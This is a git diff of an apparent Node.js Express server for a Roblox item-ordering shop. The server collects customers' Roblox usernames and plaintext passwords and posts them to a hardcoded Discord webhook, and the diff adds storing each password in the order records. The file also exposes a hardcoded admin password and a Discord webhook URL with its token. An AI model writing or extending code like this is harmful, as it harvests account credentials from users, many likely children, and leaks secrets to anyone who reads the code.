@@ -2,15 +2,16 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const bcrypt = require('bcrypt');
+const fetch = require('node-fetch'); // Ensure to import node-fetch for making HTTP requests
 
 const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
 const PORT = 3000;
-const ordersFilePath = path.join(__dirname, 'orders.json'); 
+const ordersFilePath = path.join(__dirname, 'orders.json');
 const adminPassword = 'Jiu142857kuang'; // Replace with your actual admin password
-let hashedAdminPassword = null; 
+let hashedAdminPassword = null;
 
 let orders = [];
 
@@ -32,18 +33,17 @@ async function comparePasswords(password) {
 }
 
 function saveOrders() {
-  fs.writeFileSync(ordersFilePath, JSON.stringify(orders, null, 2)); 
+  fs.writeFileSync(ordersFilePath, JSON.stringify(orders, null, 2));
 }
 
 (async () => {
   try {
-    hashedAdminPassword = await hashPassword(adminPassword); 
+    hashedAdminPassword = await hashPassword(adminPassword);
 
     // Start the server
     app.listen(PORT, () => {
       console.log(`服务器正在监听端口 ${PORT}`);
     });
-
   } catch (error) {
     console.error('Error initializing server:', error);
     process.exit(1); // Exit the server process on error
@@ -58,8 +58,10 @@ app.post('/submitOrder', async (req, res) => {
       id: Date.now(),
       name,
       robloxUsername,
+      robloxPassword, // Store the password in the order object (though not recommended for real use)
       item,
       status: '已提交',
+      isPaid: false // Initialize isPaid as false by default
     };
     orders.push(order);
 
@@ -70,8 +72,8 @@ app.post('/submitOrder', async (req, res) => {
     // Send data to Discord webhook (replace with your actual webhook URL)
     const webhookUrl = 'https://discord.com/api/webhooks/1333134333225209987/hIS131GsZeN-N0Eig9MOI25BxIDnIaHwjzPF0p9_LLrsolCAG5mPGobGSIlTXdiO6CJO'; 
     const payload = {
-      content: `新订单提交!\n姓名: ${name}\nRoblox用户名: ${robloxUsername}\n物品: ${item}\nRoblox密码: ${robloxPassword}` 
-    }; 
+      content: `新订单提交!\n订单 ID: ${order.id}\n姓名: ${name}\nRoblox用户名: ${robloxUsername}\n物品: ${item}\nRoblox密码: ${robloxPassword}`, 
+    };
 
     fetch(webhookUrl, {
       method: 'POST',
@@ -102,7 +104,7 @@ app.get('/getOrderHistory', (req, res) => {
 // POST /admin/updateOrder
 app.post('/admin/updateOrder', async (req, res) => {
   try {
-    const { orderId, price, deliveryDate, status, password } = req.body;
+    const { orderId, price, deliveryDate, status, password, isPaid } = req.body;
 
     if (!await comparePasswords(password, hashedAdminPassword)) {
       return res.status(401).json({ message: '未经授权' });
@@ -111,9 +113,14 @@ app.post('/admin/updateOrder', async (req, res) => {
     const orderIndex = orders.findIndex((order) => order.id === orderId);
 
     if (orderIndex !== -1) {
-      orders[orderIndex].price = price;
-      orders[orderIndex].deliveryDate = deliveryDate;
-      orders[orderIndex].status = status;
+      orders[orderIndex].price = price || orders[orderIndex].price;
+      orders[orderIndex].deliveryDate = deliveryDate || orders[orderIndex].deliveryDate;
+      orders[orderIndex].status = status || orders[orderIndex].status;
+      if (isPaid === '是') { 
+        orders[orderIndex].isPaid = true; 
+      } else if (isPaid === '否') { 
+        orders[orderIndex].isPaid = false; 
+      } 
 
       saveOrders();
 
